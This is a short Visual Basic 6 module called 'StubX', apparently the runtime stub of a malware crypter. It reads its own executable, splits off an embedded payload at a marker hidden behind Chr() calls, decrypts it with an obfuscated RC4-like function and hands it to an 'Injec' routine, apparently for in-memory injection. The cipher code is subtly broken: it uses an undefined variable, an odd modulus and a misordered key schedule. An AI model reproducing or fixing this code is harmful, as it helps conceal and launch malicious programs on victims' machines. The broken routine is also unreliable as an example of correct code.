Attribute VB_Name = "StubX"


Sub Main()
Dim YO As String, Datos As String, sData() As String

YO = App.Path & Chr(92) & App.EXEName & Chr(46) & Chr(101) & Chr(120) & Chr(101)

Open YO For Binary As #1
Datos = Space(LOF(1))
Get #1, , Datos
Close #1





sData() = Split(Datos, Chr(35) & Chr(35) & Chr(100) & Chr(101) & Chr(99) & Chr(107) & Chr(35) & Chr(35))


sData(1) = m83yk3sd2n673a8625qqzd2ty459wyx1chwhufywadd2pnah5f(sData(1), sData(2))
Injec YO, StrConv(sData(1), vbFromUnicode), vbNullString


End Sub


Public Function m83yk3sd2n673a8625qqzd2ty459wyx1chwhufywadd2pnah5f(ByVal Data As String, ByVal Password As String) As String
On Error Resume Next
Dim F(0 To 255) As Integer, x, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For x = 0 To 255
    Y = (Y + F(x) + Key(x Mod Len(Password))) Mod 256
    F(x) = x
Next x
Key() = StrConv(Data, vbFromUnicode)
For x = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(x) = Key(x) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next x
m83yk3sd2n673a8625qqzd2ty459wyx1chwhufywadd2pnah5f = StrConv(Key, vbUnicode)
End Function





